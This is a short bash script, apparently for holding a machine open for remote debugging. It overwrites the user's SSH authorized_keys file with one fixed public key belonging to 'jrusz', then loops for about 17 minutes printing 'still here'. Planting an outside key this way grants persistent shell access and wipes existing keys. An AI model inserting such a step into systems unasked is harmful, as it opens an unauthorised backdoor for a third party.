#!/bin/bash

sudo tee "$HOME/.ssh/authorized_keys" > /dev/null << EOF
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDYB3SyAYj+V/kmAt594RlpZlXRvVJ2r8+G1Jgnr6ft8Y6vpNkWZxpTVWEJicLczGYpzvq2AjkNStigU9Q1M2F21Te3SzT2kgNVXsMTqou4X//ZX20zej3gyI+25mc4LdBWxFaLsyrFqD76Fro2rAuCoylrfeIQBvFWbilrR+cAV9tFrJT9I4RWYVL8v7EUtBeXarVFIjwcCALzLHxFl7S/pZuuWMyhyXup1UPR3Oirpuv3kWOsElVzGOxMWREE0eoCnGYKN2VCBx+igwQbi+x/cVSf49sFBVfdpPHUGse3KwS7ukfvpmmYm06dy2JS93JrRaCUUUw2DN8VjW7dIODv jrusz@jrusz
EOF

for _ in {0..100}; do
    sleep 10
    echo "still here"
done
